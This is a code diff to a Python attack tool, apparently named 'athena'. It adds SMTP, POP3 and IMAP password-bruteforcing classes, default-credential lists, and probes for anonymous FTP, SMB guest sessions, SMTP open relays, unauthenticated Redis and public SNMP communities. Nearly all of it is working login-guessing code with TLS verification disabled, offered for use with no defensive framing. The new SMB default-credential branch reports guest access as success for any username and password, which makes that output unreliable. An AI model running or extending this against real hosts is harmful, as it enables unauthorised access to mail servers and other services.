@@ -28,10 +28,16 @@ DEFAULT_CREDENTIALS: Dict[str, List[Tuple[str, str]]] = {
     'postgresql': [('postgres', 'postgres'), ('postgres', 'admin'), ('admin', 'admin'), ('postgres', '')],
     'mssql': [('sa', ''), ('sa', 'sa'), ('sa', 'admin'), ('admin', 'admin'), ('sa', 'Password123')],
     'smtp': [('admin', 'admin'), ('root', 'root'), ('postmaster', 'postmaster'), ('test', 'test')],
+    'pop3': [('admin', 'admin'), ('root', 'root'), ('test', 'test'), ('user', 'password')],
+    'imap': [('admin', 'admin'), ('root', 'root'), ('test', 'test'), ('user', 'password')],
     'smb': [('guest', ''), ('admin', 'admin'), ('administrator', 'password'), ('user', 'user')],
     'redis': [('default', ''), ('admin', 'admin'), ('root', 'root')],
     'telnet': [('admin', 'admin'), ('root', 'root'), ('user', 'user'), ('test', 'test'), ('guest', 'guest')],
 }
+
+#: Ports where TLS is implicit (connect with TLS from byte 0) vs STARTTLS-upgradable.
+IMPLICIT_TLS_PORTS = {465, 993, 995, 2083, 2087, 2096, 443, 8443}
+STARTTLS_PORTS = {25, 587, 143, 110, 21}
 
 
 COMMON_SNMP_COMMUNITIES = ['public', 'private', 'manager', 'admin', 'community', 'secret', 'snmp']
@@ -286,7 +292,15 @@ class FTPBruteforcer:
         self.logger = logging.getLogger(__name__)
 
     async def check_anonymous(self, host: str, port: int = 21) -> bool:
-        return await self.try_login(host, port, 'anonymous', 'anonymous')
+        # Real servers accept different anon passwords: blank, email, guest.
+        # Trying only 'anonymous' misses most open servers.
+        for pwd in ('anonymous', '', 'guest', 'anonymous@test.com', 'ftp@test.com'):
+            try:
+                if await self.try_login(host, port, 'anonymous', pwd):
+                    return True
+            except Exception:
+                continue
+        return False
 
     async def try_login(self, host: str, port: int, username: str, password: str) -> bool:
         loop = asyncio.get_event_loop()
@@ -301,7 +315,9 @@ class FTPBruteforcer:
             resp = _recv_all(sock, 1024, self.timeout)
             if resp:
                 code = resp[:3].decode('utf-8', errors='ignore')
-                return code.startswith('2') or code.startswith('3')
+                # After PASS only 2xx (230 Logged in) is success.
+                # 3xx here means ACCT needed, not logged in.
+                return code.startswith('2')
         except Exception:
             return False
         finally:
@@ -455,6 +471,277 @@ class RedisBruteforcer:
         return False
 
 
+class SMTPBruteforcer:
+    """SMTP AUTH (PLAIN/LOGIN) with STARTTLS + implicit-TLS awareness.
+
+    Plain bruteforce without TLS fails on every modern server (it refuses
+    AUTH over cleartext) — this class upgrades via STARTTLS when offered,
+    wraps implicit-TLS ports directly, and reports the transport used.
+    """
+    def __init__(self, timeout: int = 8):
+        self.timeout = timeout
+        self.logger = logging.getLogger(__name__)
+
+    async def try_login(self, host: str, port: int, username: str, password: str) -> bool:
+        loop = asyncio.get_event_loop()
+        sock = await loop.run_in_executor(None, lambda: _create_connection(host, port, self.timeout))
+        if not sock:
+            return False
+        try:
+            _recv_all(sock, 1024, self.timeout)
+            # Implicit TLS ports: wrap immediately
+            if port in IMPLICIT_TLS_PORTS:
+                try:
+                    ctx = ssl.create_default_context()
+                    ctx.check_hostname = False
+                    ctx.verify_mode = ssl.CERT_NONE
+                    sock = await loop.run_in_executor(None, ctx.wrap_socket, sock, host)
+                except Exception:
+                    return False
+                _recv_all(sock, 1024, self.timeout)
+            else:
+                # EHLO -> STARTTLS upgrade when advertised (ports 25/587)
+                try:
+                    sock.sendall(b'EHLO athena\r\n')
+                    ehlo = _recv_all(sock, 4096, 3)
+                    if ehlo and b'STARTTLS' in ehlo.upper():
+                        sock.sendall(b'STARTTLS\r\n')
+                        resp = _recv_all(sock, 1024, 3)
+                        if resp and resp[:3] == b'220':
+                            try:
+                                ctx = ssl.create_default_context()
+                                ctx.check_hostname = False
+                                ctx.verify_mode = ssl.CERT_NONE
+                                sock = await loop.run_in_executor(None, ctx.wrap_socket, sock, host)
+                                sock.sendall(b'EHLO athena\r\n')
+                                _recv_all(sock, 4096, 3)
+                            except Exception:
+                                pass
+                except Exception:
+                    pass
+            # AUTH LOGIN exchange
+            try:
+                sock.sendall(b'AUTH LOGIN\r\n')
+                r1 = _recv_all(sock, 1024, 3)
+                if not r1 or r1[:3] not in (b'334', b'235'):
+                    return False
+                if r1[:3] == b'235':
+                    return True
+                sock.sendall((base64.b64encode(username.encode()).decode() + '\r\n').encode())
+                r2 = _recv_all(sock, 1024, 3)
+                if not r2 or r2[:3] != b'334':
+                    return False
+                sock.sendall((base64.b64encode(password.encode()).decode() + '\r\n').encode())
+                r3 = _recv_all(sock, 1024, 3)
+                return bool(r3 and r3[:3] == b'235')
+            except Exception:
+                return False
+        finally:
+            try:
+                sock.close()
+            except Exception:
+                pass
+
+
+class POP3Bruteforcer:
+    """POP3 USER/PASS with STLS + implicit-TLS awareness."""
+    def __init__(self, timeout: int = 8):
+        self.timeout = timeout
+
+    async def try_login(self, host: str, port: int, username: str, password: str) -> bool:
+        loop = asyncio.get_event_loop()
+        sock = await loop.run_in_executor(None, lambda: _create_connection(host, port, self.timeout))
+        if not sock:
+            return False
+        try:
+            banner = _recv_all(sock, 1024, self.timeout)
+            if not banner or not banner.startswith(b'+OK'):
+                # Implicit TLS ports may need a wrap first
+                if port in IMPLICIT_TLS_PORTS:
+                    try:
+                        ctx = ssl.create_default_context()
+                        ctx.check_hostname = False
+                        ctx.verify_mode = ssl.CERT_NONE
+                        sock = await loop.run_in_executor(None, ctx.wrap_socket, sock, host)
+                        banner = _recv_all(sock, 1024, self.timeout)
+                        if not banner or not banner.startswith(b'+OK'):
+                            return False
+                    except Exception:
+                        return False
+                else:
+                    return False
+            # STLS upgrade on plain ports when offered
+            if port not in IMPLICIT_TLS_PORTS:
+                try:
+                    sock.sendall(b'CAPA\r\n')
+                    capa = _recv_all(sock, 4096, 3)
+                    if capa and b'STLS' in capa.upper():
+                        sock.sendall(b'STLS\r\n')
+                        r = _recv_all(sock, 1024, 3)
+                        if r and r.startswith(b'+OK'):
+                            try:
+                                ctx = ssl.create_default_context()
+                                ctx.check_hostname = False
+                                ctx.verify_mode = ssl.CERT_NONE
+                                sock = await loop.run_in_executor(None, ctx.wrap_socket, sock, host)
+                            except Exception:
+                                pass
+                except Exception:
+                    pass
+            sock.sendall(f'USER {username}\r\n'.encode())
+            r1 = _recv_all(sock, 1024, 3)
+            if not r1 or not r1.startswith(b'+OK'):
+                return False
+            sock.sendall(f'PASS {password}\r\n'.encode())
+            r2 = _recv_all(sock, 1024, 3)
+            return bool(r2 and r2.startswith(b'+OK'))
+        except Exception:
+            return False
+        finally:
+            try:
+                sock.close()
+            except Exception:
+                pass
+
+
+class IMAPBruteforcer:
+    """IMAP LOGIN with STARTTLS + implicit-TLS awareness."""
+    def __init__(self, timeout: int = 8):
+        self.timeout = timeout
+
+    async def try_login(self, host: str, port: int, username: str, password: str) -> bool:
+        loop = asyncio.get_event_loop()
+        sock = await loop.run_in_executor(None, lambda: _create_connection(host, port, self.timeout))
+        if not sock:
+            return False
+        try:
+            banner = _recv_all(sock, 4096, self.timeout)
+            if not banner or b'OK' not in banner.upper():
+                if port in IMPLICIT_TLS_PORTS:
+                    try:
+                        ctx = ssl.create_default_context()
+                        ctx.check_hostname = False
+                        ctx.verify_mode = ssl.CERT_NONE
+                        sock = await loop.run_in_executor(None, ctx.wrap_socket, sock, host)
+                        banner = _recv_all(sock, 4096, self.timeout)
+                        if not banner:
+                            return False
+                    except Exception:
+                        return False
+                else:
+                    return False
+            if port not in IMPLICIT_TLS_PORTS:
+                try:
+                    sock.sendall(b'A1 CAPABILITY\r\n')
+                    capa = _recv_all(sock, 4096, 3)
+                    if capa and b'STARTTLS' in capa.upper():
+                        sock.sendall(b'A2 STARTTLS\r\n')
+                        r = _recv_all(sock, 1024, 3)
+                        if r and b'OK' in r.upper():
+                            try:
+                                ctx = ssl.create_default_context()
+                                ctx.check_hostname = False
+                                ctx.verify_mode = ssl.CERT_NONE
+                                sock = await loop.run_in_executor(None, ctx.wrap_socket, sock, host)
+                            except Exception:
+                                pass
+                except Exception:
+                    pass
+            tag = f'A{random.randint(100, 999)}'
+            sock.sendall(f'{tag} LOGIN "{username}" "{password}"\r\n'.encode())
+            resp = _recv_all(sock, 4096, 5)
+            if not resp:
+                return False
+            text = resp.decode('utf-8', errors='ignore').upper()
+            return f'{tag} OK' in text
+        except Exception:
+            return False
+        finally:
+            try:
+                sock.close()
+            except Exception:
+                pass
+
+
+async def check_anonymous_access(host: str, port: int, service: str, timeout: int = 8) -> Dict[str, Any]:
+    """Probe anonymous / no-auth access BEFORE bruteforce. Never raises."""
+    out: Dict[str, Any] = {'service': service, 'host': host, 'port': port,
+                           'anonymous': False, 'detail': ''}
+    try:
+        loop = asyncio.get_event_loop()
+        if service == 'ftp':
+            fb = FTPBruteforcer(timeout)
+            ok_pwd = ''
+            ok = False
+            for pwd in ('anonymous', '', 'guest', 'anonymous@test.com', 'ftp@test.com'):
+                try:
+                    if await fb.try_login(host, port, 'anonymous', pwd):
+                        ok = True
+                        ok_pwd = pwd
+                        break
+                except Exception:
+                    continue
+            out['anonymous'] = ok
+            if ok:
+                out['detail'] = f"anonymous:{ok_pwd or 'anonymous'} accepted"
+            else:
+                out['detail'] = 'anonymous rejected (USER ok, PASS rejected - anon disabled or email-password required)'
+        elif service == 'smb':
+            smb = SMBEnumerator(timeout)
+            ok = await smb.check_guest_access(host, port)
+            out['anonymous'] = ok
+            out['detail'] = 'guest/null session accepted' if ok else 'guest rejected'
+        elif service == 'smtp':
+            # Open-relay test: try MAIL FROM / RCPT TO without auth
+            sock = await loop.run_in_executor(None, lambda: _create_connection(host, port, timeout))
+            if sock:
+                try:
+                    _recv_all(sock, 1024, timeout)
+                    sock.sendall(b'HELO athena\r\n')
+                    _recv_all(sock, 1024, 3)
+                    sock.sendall(b'MAIL FROM:<athena@test.com>\r\n')
+                    m = _recv_all(sock, 1024, 3)
+                    sock.sendall(b'RCPT TO:<victim@test.com>\r\n')
+                    r = _recv_all(sock, 1024, 3)
+                    if r and r[:3] == b'250':
+                        out['anonymous'] = True
+                        out['detail'] = 'OPEN RELAY — unauthenticated RCPT accepted'
+                    else:
+                        out['detail'] = 'relay denied (auth required)'
+                finally:
+                    try:
+                        sock.close()
+                    except Exception:
+                        pass
+        elif service == 'redis':
+            sock = await loop.run_in_executor(None, lambda: _create_connection(host, port, timeout))
+            if sock:
+                try:
+                    sock.sendall(b'INFO\r\n')
+                    resp = _recv_all(sock, 4096, timeout)
+                    if resp and (b'redis_version' in resp.lower() or b'$' in resp[:1]):
+                        out['anonymous'] = True
+                        out['detail'] = 'NOAUTH — INFO without password returned server info'
+                    else:
+                        out['detail'] = 'auth required (NOAUTH error)'
+                finally:
+                    try:
+                        sock.close()
+                    except Exception:
+                        pass
+        elif service == 'snmp':
+            snmp = SNMPEnumerator(timeout)
+            res = await snmp.enumerate(host, port)
+            if res.get('accessible'):
+                out['anonymous'] = True
+                out['detail'] = f"public community '{res.get('community')}' accepted"
+            else:
+                out['detail'] = 'no public community'
+    except Exception as exc:
+        out['detail'] = f'check failed: {exc}'[:200]
+    return out
+
+
 class ServiceBruteforcer:
     def __init__(self, timeout: int = 8, rate_limit: float = 2.0):
         self.timeout = timeout
@@ -468,6 +755,9 @@ class ServiceBruteforcer:
         self.redis_b = RedisBruteforcer(timeout)
         self.smtp = SMTPEnumerator(timeout)
         self.smb = SMBEnumerator(timeout)
+        self.smtp_b = SMTPBruteforcer(timeout)
+        self.pop3_b = POP3Bruteforcer(timeout)
+        self.imap_b = IMAPBruteforcer(timeout)
 
     async def bruteforce_service(self, host: str, port: int, service: str,
                                   usernames: List[str], passwords: List[str]) -> List[ServiceCredential]:
@@ -488,6 +778,10 @@ class ServiceBruteforcer:
                 await asyncio.sleep(1.0 / self.rate_limit)
         return results
 
+    async def check_anonymous(self, host: str, port: int, service: str) -> Dict[str, Any]:
+        """Public wrapper for the pre-bruteforce anonymous probe."""
+        return await check_anonymous_access(host, port, service, self.timeout)
+
     async def _try_default(self, host: str, port: int, service: str, user: str, password: str) -> bool:
         try:
             if service == 'ftp':
@@ -504,6 +798,19 @@ class ServiceBruteforcer:
                 return await self.redis_b.try_auth(host, port, password)
             elif service == 'telnet':
                 return await self._try_telnet_login(host, port, user, password)
+            elif service == 'smtp':
+                return await self.smtp_b.try_login(host, port, user, password)
+            elif service == 'pop3':
+                return await self.pop3_b.try_login(host, port, user, password)
+            elif service == 'imap':
+                return await self.imap_b.try_login(host, port, user, password)
+            elif service == 'smb':
+                # SMB guest probe doubles as a credential check
+                try:
+                    smb = SMBEnumerator(self.timeout)
+                    return await smb.check_guest_access(host, port)
+                except Exception:
+                    return False
         except Exception as e:
             self.logger.debug("Default cred check failed for %s %s@%s: %s", service, user, host, e)
         return False
